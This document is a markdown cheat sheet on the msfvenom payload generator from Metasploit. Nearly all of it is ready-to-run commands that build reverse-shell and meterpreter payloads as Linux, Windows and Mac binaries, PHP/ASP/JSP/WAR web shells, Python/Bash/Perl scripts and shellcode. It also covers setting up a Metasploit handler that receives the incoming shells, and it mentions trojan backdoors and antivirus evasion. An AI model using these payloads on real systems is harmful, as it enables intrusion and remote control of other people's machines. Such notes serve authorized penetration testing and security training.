# msfvenom
Msfvenom is an utility software which comes with metasploit and it can be used
as a payload generator to be used for the following purposes:

* Payload Encoder
* Assistant in Exploit Generation
* Trojan Backdoors
* Generation of web shells

It also has an option to help with antivirus evasion (although quite limited).


Let's see how to use it, we can basically use the --list option to show the
available options for the following elements:
* payloads
* formats
* encoders
* archs (architectures)
* platforms

# General Notes

To show all payloads and get all the meterpreter related we ca do:

    msfvenom --list  payloads | grep meterpreter 

Once we select a payload, we can check what options are available for that
payload with:

    msfvenom --payload linux/x64/meterpreter/reverse_tcp  --list-options

Notice that in older versions of metasploit instead of `--list-options` we had
to use `--payload-options`.

We can check what format we have available to generate our payload:

    msfvenom --list formats
    msfvenom --list platforms

Once we see a format and platform that we need/like we can do:

    msfvenom --payload linux/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=4444 --format elf -o out_filename

Notice that with msfvenom it may be useful to use sometimes `--smallest` to
generate a very small payload.

# Generate Binaries

## Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf


## Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe


## Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho


# Web Payloads

## PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


## ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp


## JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp


## WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war


## Scripting Payloads

## Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py


## Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh


## Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl


# Shellcode
For all shellcode see 'msfvenom --help-formats' for information as
to valid parameters. Msfvenom will output code that is able to be cut
and pasted in this language for your exploits.

## Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


## Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


## Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


# Handlers
Metasploit handlers can be great at quickly setting up Metasploit to
be in a position to receive your incoming shells. Handlers should be in
the following format.

    use exploit/multi/handler
    set PAYLOAD <Payload name>   ;; it is very important to match the payload here
    set LHOST <LHOST value>
    set LPORT <LPORT value>
    set ExitOnSession false
    exploit -j -z

Once the required values are completed the following command will execute
your handler - 'msfconsole -L -r '
